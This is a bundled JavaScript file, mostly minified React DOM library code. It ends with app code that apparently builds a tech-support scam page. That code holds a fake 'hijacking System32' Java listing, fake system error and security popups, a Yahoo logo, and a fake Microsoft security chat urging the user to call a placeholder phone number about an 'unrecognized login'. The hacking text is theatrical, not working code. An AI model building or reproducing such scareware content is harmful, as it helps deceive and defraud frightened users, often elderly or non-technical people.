            href: null,
            precedence: null,
          });
          return (
            (a = (l.ownerDocument || l).createElement("style")),
            Dl(a),
            Ll(a, "style", u),
            _n(a, e.precedence, l),
            (t.instance = a)
          );
        case "stylesheet":
          u = Ta(e.href);
          var n = l.querySelector(yu(u));
          if (n) return (t.state.loading |= 4), (t.instance = n), Dl(n), n;
          (a = $d(e)),
            (u = Et.get(u)) && $f(a, u),
            (n = (l.ownerDocument || l).createElement("link")),
            Dl(n);
          var i = n;
          return (
            (i._p = new Promise(function (f, c) {
              (i.onload = f), (i.onerror = c);
            })),
            Ll(n, "link", a),
            (t.state.loading |= 4),
            _n(n, e.precedence, l),
            (t.instance = n)
          );
        case "script":
          return (
            (n = Ea(e.src)),
            (u = l.querySelector(hu(n)))
              ? ((t.instance = u), Dl(u), u)
              : ((a = e),
                (u = Et.get(n)) && ((a = R({}, e)), Ff(a, u)),
                (l = l.ownerDocument || l),
                (u = l.createElement("script")),
                Dl(u),
                Ll(u, "link", a),
                l.head.appendChild(u),
                (t.instance = u))
          );
        case "void":
          return null;
        default:
          throw Error(v(443, t.type));
      }
    else
      t.type === "stylesheet" &&
        (t.state.loading & 4) === 0 &&
        ((a = t.instance), (t.state.loading |= 4), _n(a, e.precedence, l));
    return t.instance;
  }
  function _n(l, t, e) {
    for (
      var a = e.querySelectorAll(
          'link[rel="stylesheet"][data-precedence],style[data-precedence]'
        ),
        u = a.length ? a[a.length - 1] : null,
        n = u,
        i = 0;
      i < a.length;
      i++
    ) {
      var f = a[i];
      if (f.dataset.precedence === t) n = f;
      else if (n !== u) break;
    }
    n
      ? n.parentNode.insertBefore(l, n.nextSibling)
      : ((t = e.nodeType === 9 ? e.head : e), t.insertBefore(l, t.firstChild));
  }
  function $f(l, t) {
    l.crossOrigin == null && (l.crossOrigin = t.crossOrigin),
      l.referrerPolicy == null && (l.referrerPolicy = t.referrerPolicy),
      l.title == null && (l.title = t.title);
  }
  function Ff(l, t) {
    l.crossOrigin == null && (l.crossOrigin = t.crossOrigin),
      l.referrerPolicy == null && (l.referrerPolicy = t.referrerPolicy),
      l.integrity == null && (l.integrity = t.integrity);
  }
  var On = null;
  function Id(l, t, e) {
    if (On === null) {
      var a = new Map(),
        u = (On = new Map());
      u.set(e, a);
    } else (u = On), (a = u.get(e)), a || ((a = new Map()), u.set(e, a));
    if (a.has(l)) return a;
    for (
      a.set(l, null), e = e.getElementsByTagName(l), u = 0;
      u < e.length;
      u++
    ) {
      var n = e[u];
      if (
        !(
          n[Ca] ||
          n[ql] ||
          (l === "link" && n.getAttribute("rel") === "stylesheet")
        ) &&
        n.namespaceURI !== "http://www.w3.org/2000/svg"
      ) {
        var i = n.getAttribute(t) || "";
        i = l + i;
        var f = a.get(i);
        f ? f.push(n) : a.set(i, [n]);
      }
    }
    return a;
  }
  function Pd(l, t, e) {
    (l = l.ownerDocument || l),
      l.head.insertBefore(
        e,
        t === "title" ? l.querySelector("head > title") : null
      );
  }
  function Yr(l, t, e) {
    if (e === 1 || t.itemProp != null) return !1;
    switch (l) {
      case "meta":
      case "title":
        return !0;
      case "style":
        if (
          typeof t.precedence != "string" ||
          typeof t.href != "string" ||
          t.href === ""
        )
          break;
        return !0;
      case "link":
        if (
          typeof t.rel != "string" ||
          typeof t.href != "string" ||
          t.href === "" ||
          t.onLoad ||
          t.onError
        )
          break;
        switch (t.rel) {
          case "stylesheet":
            return (
              (l = t.disabled), typeof t.precedence == "string" && l == null
            );
          default:
            return !0;
        }
      case "script":
        if (
          t.async &&
          typeof t.async != "function" &&
          typeof t.async != "symbol" &&
          !t.onLoad &&
          !t.onError &&
          t.src &&
          typeof t.src == "string"
        )
          return !0;
    }
    return !1;
  }
  function l0(l) {
    return !(l.type === "stylesheet" && (l.state.loading & 3) === 0);
  }
  function Gr(l, t, e, a) {
    if (
      e.type === "stylesheet" &&
      (typeof a.media != "string" || matchMedia(a.media).matches !== !1) &&
      (e.state.loading & 4) === 0
    ) {
      if (e.instance === null) {
        var u = Ta(a.href),
          n = t.querySelector(yu(u));
        if (n) {
          (t = n._p),
            t !== null &&
              typeof t == "object" &&
              typeof t.then == "function" &&
              (l.count++, (l = Cn.bind(l)), t.then(l, l)),
            (e.state.loading |= 4),
            (e.instance = n),
            Dl(n);
          return;
        }
        (n = t.ownerDocument || t),
          (a = $d(a)),
          (u = Et.get(u)) && $f(a, u),
          (n = n.createElement("link")),
          Dl(n);
        var i = n;
        (i._p = new Promise(function (f, c) {
          (i.onload = f), (i.onerror = c);
        })),
          Ll(n, "link", a),
          (e.instance = n);
      }
      l.stylesheets === null && (l.stylesheets = new Map()),
        l.stylesheets.set(e, t),
        (t = e.state.preload) &&
          (e.state.loading & 3) === 0 &&
          (l.count++,
          (e = Cn.bind(l)),
          t.addEventListener("load", e),
          t.addEventListener("error", e));
    }
  }
  var If = 0;
  function Xr(l, t) {
    return (
      l.stylesheets && l.count === 0 && Un(l, l.stylesheets),
      0 < l.count || 0 < l.imgCount
        ? function (e) {
            var a = setTimeout(function () {
              if ((l.stylesheets && Un(l, l.stylesheets), l.unsuspend)) {
                var n = l.unsuspend;
                (l.unsuspend = null), n();
              }
            }, 6e4 + t);
            0 < l.imgBytes && If === 0 && (If = 62500 * pr());
            var u = setTimeout(function () {
              if (
                ((l.waitingForImages = !1),
                l.count === 0 &&
                  (l.stylesheets && Un(l, l.stylesheets), l.unsuspend))
              ) {
                var n = l.unsuspend;
                (l.unsuspend = null), n();
              }
            }, (l.imgBytes > If ? 50 : 800) + t);
            return (
              (l.unsuspend = e),
              function () {
                (l.unsuspend = null), clearTimeout(a), clearTimeout(u);
              }
            );
          }
        : null
    );
  }
  function Cn() {
    if (
      (this.count--,
      this.count === 0 && (this.imgCount === 0 || !this.waitingForImages))
    ) {
      if (this.stylesheets) Un(this, this.stylesheets);
      else if (this.unsuspend) {
        var l = this.unsuspend;
        (this.unsuspend = null), l();
      }
    }
  }
  var Dn = null;
  function Un(l, t) {
    (l.stylesheets = null),
      l.unsuspend !== null &&
        (l.count++,
        (Dn = new Map()),
        t.forEach(Lr, l),
        (Dn = null),
        Cn.call(l));
  }
  function Lr(l, t) {
    if (!(t.state.loading & 4)) {
      var e = Dn.get(l);
      if (e) var a = e.get(null);
      else {
        (e = new Map()), Dn.set(l, e);
        for (
          var u = l.querySelectorAll(
              "link[data-precedence],style[data-precedence]"
            ),
            n = 0;
          n < u.length;
          n++
        ) {
          var i = u[n];
          (i.nodeName === "LINK" || i.getAttribute("media") !== "not all") &&
            (e.set(i.dataset.precedence, i), (a = i));
        }
        a && e.set(null, a);
      }
      (u = t.instance),
        (i = u.getAttribute("data-precedence")),
        (n = e.get(i) || a),
        n === a && e.set(null, u),
        e.set(i, u),
        this.count++,
        (a = Cn.bind(this)),
        u.addEventListener("load", a),
        u.addEventListener("error", a),
        n
          ? n.parentNode.insertBefore(u, n.nextSibling)
          : ((l = l.nodeType === 9 ? l.head : l),
            l.insertBefore(u, l.firstChild)),
        (t.state.loading |= 4);
    }
  }
  var vu = {
    $$typeof: Ml,
    Provider: null,
    Consumer: null,
    _currentValue: N,
    _currentValue2: N,
    _threadCount: 0,
  };
  function Qr(l, t, e, a, u, n, i, f, c) {
    (this.tag = 1),
      (this.containerInfo = l),
      (this.pingCache = this.current = this.pendingChildren = null),
      (this.timeoutHandle = -1),
      (this.callbackNode =
        this.next =
        this.pendingContext =
        this.context =
        this.cancelPendingCommit =
          null),
      (this.callbackPriority = 0),
      (this.expirationTimes = Jn(-1)),
      (this.entangledLanes =
        this.shellSuspendCounter =
        this.errorRecoveryDisabledLanes =
        this.expiredLanes =
        this.warmLanes =
        this.pingedLanes =
        this.suspendedLanes =
        this.pendingLanes =
          0),
      (this.entanglements = Jn(0)),
      (this.hiddenUpdates = Jn(null)),
      (this.identifierPrefix = a),
      (this.onUncaughtError = u),
      (this.onCaughtError = n),
      (this.onRecoverableError = i),
      (this.pooledCache = null),
      (this.pooledCacheLanes = 0),
      (this.formState = c),
      (this.incompleteTransitions = new Map());
  }
  function t0(l, t, e, a, u, n, i, f, c, h, b, x) {
    return (
      (l = new Qr(l, t, e, i, c, h, b, x, f)),
      (t = 1),
      n === !0 && (t |= 24),
      (n = ft(3, null, null, t)),
      (l.current = n),
      (n.stateNode = l),
      (t = Ci()),
      t.refCount++,
      (l.pooledCache = t),
      t.refCount++,
      (n.memoizedState = { element: a, isDehydrated: e, cache: t }),
      Ri(n),
      l
    );
  }
  function e0(l) {
    return l ? ((l = ta), l) : ta;
  }
  function a0(l, t, e, a, u, n) {
    (u = e0(u)),
      a.context === null ? (a.context = u) : (a.pendingContext = u),
      (a = ie(t)),
      (a.payload = { element: e }),
      (n = n === void 0 ? null : n),
      n !== null && (a.callback = n),
      (e = fe(l, a, t)),
      e !== null && (et(e, l, t), wa(e, l, t));
  }
  function u0(l, t) {
    if (((l = l.memoizedState), l !== null && l.dehydrated !== null)) {
      var e = l.retryLane;
      l.retryLane = e !== 0 && e < t ? e : t;
    }
  }
  function Pf(l, t) {
    u0(l, t), (l = l.alternate) && u0(l, t);
  }
  function n0(l) {
    if (l.tag === 13 || l.tag === 31) {
      var t = Oe(l, 67108864);
      t !== null && et(t, l, 67108864), Pf(l, 67108864);
    }
  }
  function i0(l) {
    if (l.tag === 13 || l.tag === 31) {
      var t = rt();
      t = wn(t);
      var e = Oe(l, t);
      e !== null && et(e, l, t), Pf(l, t);
    }
  }
  var Hn = !0;
  function Zr(l, t, e, a) {
    var u = S.T;
    S.T = null;
    var n = A.p;
    try {
      (A.p = 2), lc(l, t, e, a);
    } finally {
      (A.p = n), (S.T = u);
    }
  }
  function Vr(l, t, e, a) {
    var u = S.T;
    S.T = null;
    var n = A.p;
    try {
      (A.p = 8), lc(l, t, e, a);
    } finally {
      (A.p = n), (S.T = u);
    }
  }
  function lc(l, t, e, a) {
    if (Hn) {
      var u = tc(a);
      if (u === null) Xf(l, t, a, Rn, e), c0(l, a);
      else if (Jr(u, l, t, e, a)) a.stopPropagation();
      else if ((c0(l, a), t & 4 && -1 < Kr.indexOf(l))) {
        for (; u !== null; ) {
          var n = Ve(u);
          if (n !== null)
            switch (n.tag) {
              case 3:
                if (((n = n.stateNode), n.current.memoizedState.isDehydrated)) {
                  var i = Ee(n.pendingLanes);
                  if (i !== 0) {
                    var f = n;
                    for (f.pendingLanes |= 2, f.entangledLanes |= 2; i; ) {
                      var c = 1 << (31 - nt(i));
                      (f.entanglements[1] |= c), (i &= ~c);
                    }
                    Ut(n), (tl & 6) === 0 && ((mn = at() + 500), su(0));
                  }
                }
                break;
              case 31:
              case 13:
                (f = Oe(n, 2)), f !== null && et(f, n, 2), Sn(), Pf(n, 2);
            }
          if (((n = tc(a)), n === null && Xf(l, t, a, Rn, e), n === u)) break;
          u = n;
        }
        u !== null && a.stopPropagation();
      } else Xf(l, t, a, null, e);
    }
  }
  function tc(l) {
    return (l = ei(l)), ec(l);
  }
  var Rn = null;
  function ec(l) {
    if (((Rn = null), (l = Ze(l)), l !== null)) {
      var t = V(l);
      if (t === null) l = null;
      else {
        var e = t.tag;
        if (e === 13) {
          if (((l = sl(t)), l !== null)) return l;
          l = null;
        } else if (e === 31) {
          if (((l = Ol(t)), l !== null)) return l;
          l = null;
        } else if (e === 3) {
          if (t.stateNode.current.memoizedState.isDehydrated)
            return t.tag === 3 ? t.stateNode.containerInfo : null;
          l = null;
        } else t !== l && (l = null);
      }
    }
    return (Rn = l), null;
  }
  function f0(l) {
    switch (l) {
      case "beforetoggle":
      case "cancel":
      case "click":
      case "close":
      case "contextmenu":
      case "copy":
      case "cut":
      case "auxclick":
      case "dblclick":
      case "dragend":
      case "dragstart":
      case "drop":
      case "focusin":
      case "focusout":
      case "input":
      case "invalid":
      case "keydown":
      case "keypress":
      case "keyup":
      case "mousedown":
      case "mouseup":
      case "paste":
      case "pause":
      case "play":
      case "pointercancel":
      case "pointerdown":
      case "pointerup":
      case "ratechange":
      case "reset":
      case "resize":
      case "seeked":
      case "submit":
      case "toggle":
      case "touchcancel":
      case "touchend":
      case "touchstart":
      case "volumechange":
      case "change":
      case "selectionchange":
      case "textInput":
      case "compositionstart":
      case "compositionend":
      case "compositionupdate":
      case "beforeblur":
      case "afterblur":
      case "beforeinput":
      case "blur":
      case "fullscreenchange":
      case "focus":
      case "hashchange":
      case "popstate":
      case "select":
      case "selectstart":
        return 2;
      case "drag":
      case "dragenter":
      case "dragexit":
      case "dragleave":
      case "dragover":
      case "mousemove":
      case "mouseout":
      case "mouseover":
      case "pointermove":
      case "pointerout":
      case "pointerover":
      case "scroll":
      case "touchmove":
      case "wheel":
      case "mouseenter":
      case "mouseleave":
      case "pointerenter":
      case "pointerleave":
        return 8;
      case "message":
        switch (C0()) {
          case hc:
            return 2;
          case vc:
            return 8;
          case zu:
          case D0:
            return 32;
          case mc:
            return 268435456;
          default:
            return 32;
        }
      default:
        return 32;
    }
  }
  var ac = !1,
    Se = null,
    be = null,
    pe = null,
    mu = new Map(),
    gu = new Map(),
    xe = [],
    Kr =
      "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(
        " "
      );
  function c0(l, t) {
    switch (l) {
      case "focusin":
      case "focusout":
        Se = null;
        break;
      case "dragenter":
      case "dragleave":
        be = null;
        break;
      case "mouseover":
      case "mouseout":
        pe = null;
        break;
      case "pointerover":
      case "pointerout":
        mu.delete(t.pointerId);
        break;
      case "gotpointercapture":
      case "lostpointercapture":
        gu.delete(t.pointerId);
    }
  }
  function Su(l, t, e, a, u, n) {
    return l === null || l.nativeEvent !== n
      ? ((l = {
          blockedOn: t,
          domEventName: e,
          eventSystemFlags: a,
          nativeEvent: n,
          targetContainers: [u],
        }),
        t !== null && ((t = Ve(t)), t !== null && n0(t)),
        l)
      : ((l.eventSystemFlags |= a),
        (t = l.targetContainers),
        u !== null && t.indexOf(u) === -1 && t.push(u),
        l);
  }
  function Jr(l, t, e, a, u) {
    switch (t) {
      case "focusin":
        return (Se = Su(Se, l, t, e, a, u)), !0;
      case "dragenter":
        return (be = Su(be, l, t, e, a, u)), !0;
      case "mouseover":
        return (pe = Su(pe, l, t, e, a, u)), !0;
      case "pointerover":
        var n = u.pointerId;
        return mu.set(n, Su(mu.get(n) || null, l, t, e, a, u)), !0;
      case "gotpointercapture":
        return (
          (n = u.pointerId), gu.set(n, Su(gu.get(n) || null, l, t, e, a, u)), !0
        );
    }
    return !1;
  }
  function s0(l) {
    var t = Ze(l.target);
    if (t !== null) {
      var e = V(t);
      if (e !== null) {
        if (((t = e.tag), t === 13)) {
          if (((t = sl(e)), t !== null)) {
            (l.blockedOn = t),
              zc(l.priority, function () {
                i0(e);
              });
            return;
          }
        } else if (t === 31) {
          if (((t = Ol(e)), t !== null)) {
            (l.blockedOn = t),
              zc(l.priority, function () {
                i0(e);
              });
            return;
          }
        } else if (t === 3 && e.stateNode.current.memoizedState.isDehydrated) {
          l.blockedOn = e.tag === 3 ? e.stateNode.containerInfo : null;
          return;
        }
      }
    }
    l.blockedOn = null;
  }
  function Bn(l) {
    if (l.blockedOn !== null) return !1;
    for (var t = l.targetContainers; 0 < t.length; ) {
      var e = tc(l.nativeEvent);
      if (e === null) {
        e = l.nativeEvent;
        var a = new e.constructor(e.type, e);
        (ti = a), e.target.dispatchEvent(a), (ti = null);
      } else return (t = Ve(e)), t !== null && n0(t), (l.blockedOn = e), !1;
      t.shift();
    }
    return !0;
  }
  function o0(l, t, e) {
    Bn(l) && e.delete(t);
  }
  function wr() {
    (ac = !1),
      Se !== null && Bn(Se) && (Se = null),
      be !== null && Bn(be) && (be = null),
      pe !== null && Bn(pe) && (pe = null),
      mu.forEach(o0),
      gu.forEach(o0);
  }
  function Nn(l, t) {
    l.blockedOn === t &&
      ((l.blockedOn = null),
      ac ||
        ((ac = !0),
        E.unstable_scheduleCallback(E.unstable_NormalPriority, wr)));
  }
  var qn = null;
  function d0(l) {
    qn !== l &&
      ((qn = l),
      E.unstable_scheduleCallback(E.unstable_NormalPriority, function () {
        qn === l && (qn = null);
        for (var t = 0; t < l.length; t += 3) {
          var e = l[t],
            a = l[t + 1],
            u = l[t + 2];
          if (typeof a != "function") {
            if (ec(a || e) === null) continue;
            break;
          }
          var n = Ve(e);
          n !== null &&
            (l.splice(t, 3),
            (t -= 3),
            lf(n, { pending: !0, data: u, method: e.method, action: a }, a, u));
        }
      }));
  }
  function Aa(l) {
    function t(c) {
      return Nn(c, l);
    }
    Se !== null && Nn(Se, l),
      be !== null && Nn(be, l),
      pe !== null && Nn(pe, l),
      mu.forEach(t),
      gu.forEach(t);
    for (var e = 0; e < xe.length; e++) {
      var a = xe[e];
      a.blockedOn === l && (a.blockedOn = null);
    }
    for (; 0 < xe.length && ((e = xe[0]), e.blockedOn === null); )
      s0(e), e.blockedOn === null && xe.shift();
    if (((e = (l.ownerDocument || l).$$reactFormReplay), e != null))
      for (a = 0; a < e.length; a += 3) {
        var u = e[a],
          n = e[a + 1],
          i = u[$l] || null;
        if (typeof n == "function") i || d0(e);
        else if (i) {
          var f = null;
          if (n && n.hasAttribute("formAction")) {
            if (((u = n), (i = n[$l] || null))) f = i.formAction;
            else if (ec(u) !== null) continue;
          } else f = i.action;
          typeof f == "function" ? (e[a + 1] = f) : (e.splice(a, 3), (a -= 3)),
            d0(e);
        }
      }
  }
  function r0() {
    function l(n) {
      n.canIntercept &&
        n.info === "react-transition" &&
        n.intercept({
          handler: function () {
            return new Promise(function (i) {
              return (u = i);
            });
          },
          focusReset: "manual",
          scroll: "manual",
        });
    }
    function t() {
      u !== null && (u(), (u = null)), a || setTimeout(e, 20);
    }
    function e() {
      if (!a && !navigation.transition) {
        var n = navigation.currentEntry;
        n &&
          n.url != null &&
          navigation.navigate(n.url, {
            state: n.getState(),
            info: "react-transition",
            history: "replace",
          });
      }
    }
    if (typeof navigation == "object") {
      var a = !1,
        u = null;
      return (
        navigation.addEventListener("navigate", l),
        navigation.addEventListener("navigatesuccess", t),
        navigation.addEventListener("navigateerror", t),
        setTimeout(e, 100),
        function () {
          (a = !0),
            navigation.removeEventListener("navigate", l),
            navigation.removeEventListener("navigatesuccess", t),
            navigation.removeEventListener("navigateerror", t),
            u !== null && (u(), (u = null));
        }
      );
    }
  }
  function uc(l) {
    this._internalRoot = l;
  }
  (Yn.prototype.render = uc.prototype.render =
    function (l) {
      var t = this._internalRoot;
      if (t === null) throw Error(v(409));
      var e = t.current,
        a = rt();
      a0(e, a, l, t, null, null);
    }),
    (Yn.prototype.unmount = uc.prototype.unmount =
      function () {
        var l = this._internalRoot;
        if (l !== null) {
          this._internalRoot = null;
          var t = l.containerInfo;
          a0(l.current, 2, null, l, null, null), Sn(), (t[Qe] = null);
        }
      });
  function Yn(l) {
    this._internalRoot = l;
  }
  Yn.prototype.unstable_scheduleHydration = function (l) {
    if (l) {
      var t = xc();
      l = { blockedOn: null, target: l, priority: t };
      for (var e = 0; e < xe.length && t !== 0 && t < xe[e].priority; e++);
      xe.splice(e, 0, l), e === 0 && s0(l);
    }
  };
  var y0 = H.version;
  if (y0 !== "19.2.4") throw Error(v(527, y0, "19.2.4"));
  A.findDOMNode = function (l) {
    var t = l._reactInternals;
    if (t === void 0)
      throw typeof l.render == "function"
        ? Error(v(188))
        : ((l = Object.keys(l).join(",")), Error(v(268, l)));
    return (
      (l = T(t)),
      (l = l !== null ? I(l) : null),
      (l = l === null ? null : l.stateNode),
      l
    );
  };
  var Wr = {
    bundleType: 0,
    version: "19.2.4",
    rendererPackageName: "react-dom",
    currentDispatcherRef: S,
    reconcilerVersion: "19.2.4",
  };
  if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
    var Gn = __REACT_DEVTOOLS_GLOBAL_HOOK__;
    if (!Gn.isDisabled && Gn.supportsFiber)
      try {
        (Ma = Gn.inject(Wr)), (ut = Gn);
      } catch {}
  }
  return (
    (pu.createRoot = function (l, t) {
      if (!O(l)) throw Error(v(299));
      var e = !1,
        a = "",
        u = po,
        n = xo,
        i = zo;
      return (
        t != null &&
          (t.unstable_strictMode === !0 && (e = !0),
          t.identifierPrefix !== void 0 && (a = t.identifierPrefix),
          t.onUncaughtError !== void 0 && (u = t.onUncaughtError),
          t.onCaughtError !== void 0 && (n = t.onCaughtError),
          t.onRecoverableError !== void 0 && (i = t.onRecoverableError)),
        (t = t0(l, 1, !1, null, null, e, a, null, u, n, i, r0)),
        (l[Qe] = t.current),
        Gf(l),
        new uc(t)
      );
    }),
    (pu.hydrateRoot = function (l, t, e) {
      if (!O(l)) throw Error(v(299));
      var a = !1,
        u = "",
        n = po,
        i = xo,
        f = zo,
        c = null;
      return (
        e != null &&
          (e.unstable_strictMode === !0 && (a = !0),
          e.identifierPrefix !== void 0 && (u = e.identifierPrefix),
          e.onUncaughtError !== void 0 && (n = e.onUncaughtError),
          e.onCaughtError !== void 0 && (i = e.onCaughtError),
          e.onRecoverableError !== void 0 && (f = e.onRecoverableError),
          e.formState !== void 0 && (c = e.formState)),
        (t = t0(l, 1, !0, t, e ?? null, a, u, c, n, i, f, r0)),
        (t.context = e0(null)),
        (e = t.current),
        (a = rt()),
        (a = wn(a)),
        (u = ie(a)),
        (u.callback = null),
        fe(e, u, a),
        (e = a),
        (t.current.lanes = e),
        Oa(t, e),
        Ut(t),
        (l[Qe] = t.current),
        Gf(l),
        new Yn(t)
      );
    }),
    (pu.version = "19.2.4"),
    pu
  );
}
var T0;
function uy() {
  if (T0) return ic.exports;
  T0 = 1;
  function E() {
    if (
      !(
        typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" ||
        typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"
      )
    )
      try {
        __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(E);
      } catch (H) {
        console.error(H);
      }
  }
  return E(), (ic.exports = ay()), ic.exports;
}
var ny = uy(),
  bl = dc();
const iy = "" + new URL("bg-Cces4HUG.webp", import.meta.url).href,
  E0 = [
    "import java.awt.*;",
    "import java.util.Scanner;",
    "public class Connection {",
    '  private String db = "SQL Mail";',
    '  private String version = "0.0.1";',
    '  private String author = "Jeffrey Cobb";',
    '  private String date = "August 8th, 2007";',
    '  private System.getProperty("user.dir");',
    '  private String driver = "smallsql.database.SSDriver";',
    '  private String url = "jdbc:smallsql:*";',
    '  private String dbPath = AppPath + "/sqlmail";',
    '  private String preferences = AppPath + "/sqlmail_prefs";',
    "  /* Start of Main */",
    "  public static void main(String[] args) throws Exception {",
    "    // Processing logic here",
    "    Connection conn = new Connection();",
    "    conn.init();",
    "    Toolkit tk = Toolkit.getDefaultToolkit();",
    "    Dimension screen = tk.getScreenSize();",
    '    System.out.println(screen.getWidth() + "x" + screen.getHeight());',
    '    System.setProperty("java.net.preferIPv4Stack", "true");',
    '    System.loadLibrary("native-lib");',
    '    System.out.println("Attempting to hijack System32 via buffer overflow...");',
    '    byte[] payload = Trojan.generatePayload("Hive.ZY");',
    "    Memory.write(0x88412, payload);",
    "    Thread.sleep(500);",
    '    System.out.println("Payload injected. Port 4444 open.");',
    "  }",
  ],
  A0 = [
    {
      title: "System Error",
      content: "Memory access violation at 0x88412.",
      type: "error",
    },
    {
      title: "Security",
      content: "Password required for System32.",
      type: "security",
    },
  ],
  fy = [
    { id: 1, text: "Today, 02:53 PM", type: "timestamp" },
    { id: 2, text: "Microsoft account analysis...", type: "system" },
    { id: 3, text: "Alert: Unrecognized login.", type: "system" },
    {
      id: 4,
      text: "Hello, anomalous activity detected from your IP (United States). Access at risk.",
      type: "support",
    },
    {
      id: 5,
      text: "Call PHONE_PLACEHOLDER immediately for emergency data security.",
      type: "support",
    },
  ];
function cy() {
  return s.jsx("svg", {
    "aria-label": "Yahoo",
    style: { fill: "#6001d2", height: 24 },
    viewBox: "0 0 86 24",
    role: "img",
    xmlns: "http://www.w3.org/2000/svg",
    children: s.jsx("path", {
      d: "M24.778 5.86703V7.1099C24.07 6.18452 22.7591 5.55223 21.241 5.55223C17.6528 5.55223 14.9798 8.74625 14.9798 12.4966C14.9798 16.3501 17.6259 19.441 21.241 19.441C22.7591 19.441 24.07 18.8331 24.778 17.8562V19.0963H29.2544V5.86703H24.778ZM30.7995 0.00539959V19.0963H35.4375V12.0407C35.4375 10.6676 36.0916 9.85073 37.1387 9.85073C38.1858 9.85073 38.7376 10.5617 38.7376 11.8833V19.0909H43.3729V10.7734C43.3729 7.55223 41.6448 5.5468 38.8668 5.5468C38.2059 5.52267 37.5486 5.65577 36.9481 5.93534C36.3476 6.21491 35.8209 6.63311 35.4106 7.15604V0L30.7995 0.00539959ZM73.2061 12.4884C73.2061 16.4477 70.194 19.4328 66.1859 19.4328C62.1778 19.4328 59.1657 16.4477 59.1657 12.4884C59.1657 8.52915 62.1778 5.54408 66.1859 5.54408C70.194 5.54408 73.2061 8.52915 73.2061 12.4884ZM58.3797 12.4884C58.3797 16.4477 55.3676 19.4328 51.3622 19.4328C47.3568 19.4328 44.342 16.4477 44.342 12.4884C44.342 8.52915 47.3541 5.54408 51.3622 5.54408C55.3702 5.54408 58.3797 8.52915 58.3797 12.4884ZM0 5.85888L5.60432 19.194L3.58816 24H8.51146L15.9758 5.85888H11.0794L8.04039 13.6201L5.02827 5.85617L0 5.85888ZM22.1831 15.2076C21.826 15.2152 21.471 15.1505 21.1392 15.0172C20.8074 14.884 20.5055 14.6849 20.2515 14.4318C19.9974 14.1787 19.7964 13.8768 19.6602 13.5439C19.5241 13.211 19.4557 12.8539 19.459 12.4939C19.4553 12.1337 19.5235 11.7765 19.6595 11.4434C19.7955 11.1103 19.9965 10.8083 20.2506 10.5551C20.5048 10.3019 20.8068 10.1029 21.1388 9.96976C21.4708 9.83663 21.8259 9.77215 22.1831 9.78017C22.5378 9.7758 22.8898 9.84301 23.2183 9.97784C23.5468 10.1127 23.8453 10.3124 24.0961 10.5653C24.347 10.8181 24.5451 11.119 24.6788 11.4502C24.8126 11.7815 24.8792 12.1363 24.8749 12.4939C24.8792 12.8515 24.8126 13.2063 24.6788 13.5375C24.5451 13.8687 24.347 14.1696 24.0961 14.4225C23.8453 14.6754 23.5468 14.8751 23.2183 15.0099C22.8898 15.1447 22.5378 15.212 22.1831 15.2076ZM53.9813 12.4939C53.9896 12.1436 53.9278 11.7951 53.7995 11.4695C53.6712 11.1438 53.479 10.8476 53.2345 10.5985C52.9899 10.3495 52.6981 10.1527 52.3764 10.02C52.0547 9.88735 51.7097 9.82147 51.3622 9.82632C51.0146 9.82147 50.6697 9.88735 50.3479 10.02C50.0262 10.1527 49.7344 10.3495 49.4898 10.5985C49.2453 10.8476 49.0532 11.1438 48.9248 11.4695C48.7965 11.7951 48.7347 12.1436 48.743 12.4939C48.7347 12.8441 48.7965 13.1924 48.9249 13.5179C49.0532 13.8434 49.2454 14.1395 49.49 14.3883C49.7346 14.6371 50.0264 14.8336 50.3481 14.966C50.6698 15.0984 51.0147 15.164 51.3622 15.1588C51.7096 15.164 52.0545 15.0984 52.3762 14.966C52.6979 14.8336 52.9898 14.6371 53.2343 14.3883C53.4789 14.1395 53.6711 13.8434 53.7995 13.5179C53.9278 13.1924 53.9897 12.8441 53.9813 12.4939ZM68.805 12.4939C68.8134 12.1436 68.7515 11.7951 68.6232 11.4695C68.4949 11.1438 68.3027 10.8476 68.0582 10.5985C67.8137 10.3495 67.5218 10.1527 67.2001 10.02C66.8784 9.88735 66.5334 9.82147 66.1859 9.82632C65.8383 9.82147 65.4934 9.88735 65.1717 10.02C64.8499 10.1527 64.5581 10.3495 64.3136 10.5985C64.069 10.8476 63.8769 11.1438 63.7486 11.4695C63.6202 11.7951 63.5584 12.1436 63.5668 12.4939C63.5584 12.8441 63.6202 13.1924 63.7486 13.5179C63.8769 13.8434 64.0692 14.1395 64.3137 14.3883C64.5583 14.6371 64.8502 14.8336 65.1719 14.966C65.4936 15.0984 65.8384 15.164 66.1859 15.1588C66.5333 15.164 66.8782 15.0984 67.1999 14.966C67.5216 14.8336 67.8135 14.6371 68.058 14.3883C68.3026 14.1395 68.4948 13.8434 68.6232 13.5179C68.7515 13.1546 68.8134 12.8441 68.805 12.4939ZM73.7821 16.2931C73.7767 16.6934 73.8508 17.0908 74 17.4618C74.1493 17.8328 74.3706 18.1699 74.651 18.4534C74.9314 18.7369 75.2653 18.9609 75.6329 19.1123C76.0005 19.2638 76.3945 19.3395 76.7916 19.3352C77.2018 19.3384 77.6086 19.2593 77.9882 19.1025C78.3679 18.9458 78.7128 18.7145 79.0029 18.422C79.293 18.1295 79.5225 17.7818 79.678 17.3991C79.8335 17.0164 79.9119 16.6062 79.9087 16.1927C79.9156 15.792 79.8424 15.394 79.6935 15.0224C79.5446 14.6508 79.323 14.3133 79.0419 14.0299C78.7608 13.7465 78.426 13.5231 78.0574 13.373C77.6888 13.2228 77.294 13.1491 76.8965 13.156C76.4868 13.1546 76.0808 13.2349 75.702 13.3923C75.3232 13.5497 74.979 13.7811 74.6893 14.0732C74.3995 14.3653 74.17 14.7123 74.0138 15.0942C73.8577 15.4761 73.778 15.8854 73.7794 16.2985L73.7821 16.2931ZM80.3824 0.0108323L75.4457 11.9919H80.9477L85.871 0.00268323L80.3824 0.0108323Z",
    }),
  });
}
function j0({ width: E = 16, height: H = 16 }) {
  return s.jsxs("svg", {
    xmlns: "http://www.w3.org/2000/svg",
    width: E,
    height: H,
    viewBox: "0 0 48 48",
    children: [
      s.jsx("path", {
        fill: "#1e88e5",
